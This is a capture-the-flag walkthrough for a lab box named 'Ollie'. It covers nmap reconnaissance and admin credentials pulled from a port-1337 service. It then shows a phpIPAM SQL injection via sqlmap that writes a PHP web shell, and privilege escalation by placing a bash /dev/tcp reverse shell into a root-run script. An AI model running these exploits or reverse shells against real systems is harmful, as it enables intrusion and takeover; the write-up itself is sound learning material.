# nmap -sC -sV -sT -T4 -p- -vv -oN box 10.10.117.132
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b7:1b:a8:f8:8c:8a:4a:53:55:c0:2e:89:01:f2:56:69 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP5+l/iCTR0Sqa4q0dIntXiVyRE5hsnPV5UfG4D+sQKeM4XoG7mzycPzJxn9WkONCwgmLWyFD1wHOnexqtxEOoyCrHhP2xGz+5sOsJ7RbpA0KL/CAUKs2aCtonKUwg5FEhOjUy945M0e/DmstbOYx8od6603eb4TytHfxQHPPiWBBRCmg6e+5UjcHLSOqDEzXkDOmmLieiE008fEVrNAmF2J+I4XPJI7Usaf3IzpnaFm3Ca9YvNAr4t8gpDST2uNuRWA9NCMspBFEj/5YQfjOnYx2cSSZHUP3lK8tiwc/RWSk7OBTXYOBncyV4lw8OiyJ1fOhr/2gXTXE/tWQvu1zKWYYafMKRdsH6nuE5nZ0CK3pLHe/nUgIsVPl7sJ3QlqJF7Wd5OmY3e4Py7movqFm/HmW+zjwsXGHnzENC47N+RxV0XTYCxbKzTAZDo5gLMxmsbXWnQmU5GMk0e9sh7HHybmWWkKKYJiOp+3yM9vTPXPiNXBeJmvWa01hoAAi+3OU=
|   256 4e:27:43:b6:f4:54:f9:18:d0:38:da:cd:76:9b:85:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFL/P1VyyCYVY2aUZcXTLmHkiXGo4/KdJptRP7Wioy78Sb/W/bKDAq3Yl6a6RQW7KlGSbZ84who5gWwVMTSTt2U=
|   256 14:82:ca:bb:04:e5:01:83:9c:d6:54:e9:d1:fa:c4:82 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHmTKDYCCJVK6wx0kZdjLd1YZeLryW/qXfKAfzqN/UHv
80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Ollie :: login
|_Requested resource was http://10.10.117.132/index.php?page=login
|_http-favicon: Unknown favicon MD5: 851615F43921F017A297184922B4FBFD
| http-robots.txt: 2 disallowed entries 
|_/ /immaolllieeboyyy
|_http-server-header: Apache/2.4.41 (Ubuntu)
1337/tcp open  waste?  syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, GenericLines: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, 
|     It's been a while. What are you here for?
|   DNSVersionBindReqTCP: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, 
|     version
|     bind
|     It's been a while. What are you here for?
|   GetRequest: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Get / http/1.0
|     It's been a while. What are you here for?
|   HTTPOptions: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Options / http/1.0
|     It's been a while. What are you here for?
|   Help: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Help
|     It's been a while. What are you here for?
|   NULL, RPCCheck: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name?
|   RTSPRequest: 
|     Hey stranger, I'm Ollie, protector of panels, lover of deer antlers.
|     What is your name? What's up, Options / rtsp/1.0
|_    It's been a while. What are you here for?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.94%I=7%D=12/30%Time=658FB9B4%P=x86_64-pc-linux-gnu%r(N
SF:ULL,59,"Hey\x20stranger,\x20I'm\x20Ollie,\x20protector\x20of\x20panels,
SF:\x20lover\x20of\x20deer\x20antlers\.\n\nWhat\x20is\x20your\x20name\?\x2
...

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


Try out port 1337, its a weird port

port 1337

nc ${IP} 1337 
answer the questions  and eventually

```
After a lengthy discussion, we've come to the conclusion that you are the right person for the job.Here are the credentials for our administration panel.

                    Username: admin

                    Password: OllieUnixMontgomery!
```

login and get phpIpam access.

search vulnerabilities

searchsploit gives CVE php/webapps/50963.py

http://10.10.117.132/evil.php?cmd=cat%20config.php

$db['host'] = 'localhost';
$db['user'] = 'phpipam_ollie';
$db['pass'] = 'IamDah1337estHackerDog!';
$db['name'] = 'phpipam';
$db['port'] = 3306;

but dead end for the rest.

it uses SQLi to get shell on the edit-bgp-mapping-search.php page.

so capture a request by setting up a localhost:8081 proxy with burpsuite and run.
proxy on localhost 8081 redirect to ${IP}

python3 50684.py -u http://localhost:8081 -U admin -P OllieUnixMontgomery!

Then change the subnet variable to:

POST /app/admin/routing/edit-bgp-mapping-search.php HTTP/1.1
Host: 10.10.117.132:80
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: phpipam=rnu8br5ibkc9vceq543pch2p5b
Content-Length: 22

subnet=inject&bgp_id=1

copy kali's php revshell to local and change port and IP

then run

sqlmap -r sqli.txt --file-write=sh.php -file-dest=/var/www/html/sh.php --batch

sh.php is written, start a nc listener and access http://${IP}/sh.php

and we have shell.

upgrade to proper shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
ctrl-z
stty raw -echo
<enter>

```

Reuse ollie password works! ```su ollie``` 


PRIVILEGE ESCALATION!

linpeas.sh nothing, sudo version is vulnerable but not this one as sudoedit -s Y shows usage arguments

https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit

run PSPY64

python3 -u olliebot.py is interesting, UID=0, but cant find it on disk

/bin/bash /usr/bin/feedme also interesting, running as UID 0

```
cat /usr/bin/feedme
#!/bin/bash

# This is weird?
```

So that must be the privesc design.

Put a revshell in there

bash -i >& /dev/tcp/10.9.6.179/10667 0>&1

run "pspy64 | grep bash" and wait.

BOOM shell!

and cat root.txt
